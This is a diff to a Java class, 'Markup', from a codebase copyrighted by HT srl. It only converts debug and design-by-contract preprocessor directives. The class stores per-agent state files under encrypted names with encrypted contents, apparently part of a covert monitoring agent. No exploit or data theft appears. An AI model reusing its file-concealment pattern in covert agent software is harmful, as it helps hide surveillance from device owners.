@@ -1,3 +1,4 @@
+//#preprocess
 /* *************************************************
  * Copyright (c) 2010 - 2010
  * HT srl,   All rights reserved.
@@ -31,8 +32,10 @@ public final class Markup {
 
     private int agentId = 0;
 
-    //#debug
+    //#ifdef DEBUG
     private static Debug debug = new Debug("Markup", DebugLevel.VERBOSE);
+
+    //#endif
 
     /**
      * Override della funzione precedente: invece di generare il nome da una
@@ -46,12 +49,13 @@ public final class Markup {
      * @return the string
      */
     static String makeMarkupName(final int agentId, final boolean addPath) {
-        // #ifdef DBC
+        //#ifdef DBC
         Check.requires(agentId >= 0, "agentId < 0");
-        // #endif
+        //#endif
         final String logName = NumberUtilities.toString(agentId, 16, 4);
-        // #debug debug
+        //#ifdef DEBUG_TRACE
         debug.trace("makeMarkupName from: " + logName);
+        //#endif
 
         final String markupName = makeMarkupName(logName, addPath, false);
         return markupName;
@@ -77,12 +81,12 @@ public final class Markup {
      */
     static String makeMarkupName(final String markupName,
             final boolean addPath, final boolean storeToMMC) {
-        // #ifdef DBC
+        //#ifdef DBC
         Check.requires(markupName != null, "null markupName");
-        // #endif
-        // #ifdef DBC
+        //#endif
+        //#ifdef DBC
         Check.requires(markupName != "", "empty markupName");
-        // #endif
+        //#endif
 
         String encName = "";
 
@@ -96,8 +100,9 @@ public final class Markup {
 
         encName += Encryption.encryptName(markupName + MARKUP_EXTENSION, Keys
                 .getInstance().getChallengeKey()[0]);
-        // #debug debug
+        //#ifdef DEBUG_TRACE
         debug.trace("makeMarkupName: " + encName);
+        //#endif
 
         return encName;
     }
@@ -112,14 +117,14 @@ public final class Markup {
      */
 
     public static synchronized void removeMarkup(final int agentId_) {
-        // #ifdef DBC
+        //#ifdef DBC
         Check.requires(agentId_ > 0, "agentId null");
-        // #endif
+        //#endif
 
         final String markupName = makeMarkupName(agentId_, true);
-        // #ifdef DBC
+        //#ifdef DBC
         Check.asserts(markupName != "", "markupName empty");
-        // #endif
+        //#endif
 
         final AutoFlashFile file = new AutoFlashFile(markupName, true);
         file.delete();
@@ -206,14 +211,14 @@ public final class Markup {
      * @return true, if is markup
      */
     public synchronized boolean isMarkup() {
-        // #ifdef DBC
+        //#ifdef DBC
         Check.requires(agentId > 0, "agentId null");
-        // #endif
+        //#endif
 
         final String markupName = makeMarkupName(agentId, true);
-        // #ifdef DBC
+        //#ifdef DBC
         Check.asserts(markupName != "", "markupName empty");
-        // #endif
+        //#endif
 
         final AutoFlashFile fileRet = new AutoFlashFile(markupName, true);
 
@@ -233,14 +238,14 @@ public final class Markup {
      *             Signals that an I/O exception has occurred.
      */
     public synchronized byte[] readMarkup() throws IOException {
-        // #ifdef DBC
+        //#ifdef DBC
         Check.requires(agentId > 0, "agentId null");
-        // #endif
+        //#endif
 
         final String markupName = makeMarkupName(agentId, true);
-        // #ifdef DBC
+        //#ifdef DBC
         Check.asserts(markupName != "", "markupName empty");
-        // #endif
+        //#endif
 
         final AutoFlashFile fileRet = new AutoFlashFile(markupName, true);
 
@@ -249,17 +254,18 @@ public final class Markup {
             final int len = Utils.byteArrayToInt(encData, 0);
 
             final byte[] plain = encryption.decryptData(encData, len, 4);
-            // #ifdef DBC
+            //#ifdef DBC
             Check.asserts(plain != null, "wrong decryption: null");
-            // #endif
-            // #ifdef DBC
+            //#endif
+            //#ifdef DBC
             Check.asserts(plain.length == len, "wrong decryption: len");
-            // #endif
+            //#endif
 
             return plain;
         } else {
-            // #debug debug
+            //#ifdef DEBUG_TRACE
             debug.trace("Markup file does not exists");
+            //#endif
             return null;
         }
     }
@@ -268,14 +274,14 @@ public final class Markup {
      * Removes the markup.
      */
     public synchronized void removeMarkup() {
-        // #ifdef DBC
+        //#ifdef DBC
         Check.requires(agentId > 0, "agentId null");
-        // #endif
+        //#endif
 
         final String markupName = makeMarkupName(agentId, true);
-        // #ifdef DBC
+        //#ifdef DBC
         Check.asserts(markupName != "", "markupName empty");
-        // #endif
+        //#endif
 
         final AutoFlashFile remove = new AutoFlashFile(markupName, true);
         remove.delete();
@@ -295,9 +301,9 @@ public final class Markup {
      */
     public synchronized boolean writeMarkup(final byte[] data) {
         final String markupName = makeMarkupName(agentId, true);
-        // #ifdef DBC
+        //#ifdef DBC
         Check.asserts(markupName != "", "markupName empty");
-        // #endif
+        //#endif
 
         final AutoFlashFile fileRet = new AutoFlashFile(markupName, true);
 
@@ -306,9 +312,9 @@ public final class Markup {
 
         if (data != null) {
             final byte[] encData = encryption.encryptData(data);
-            // #ifdef DBC
+            //#ifdef DBC
             Check.asserts(encData.length >= data.length, "strange data len");
-            // #endif
+            //#endif
             fileRet.write(data.length);
             fileRet.append(encData);
         }
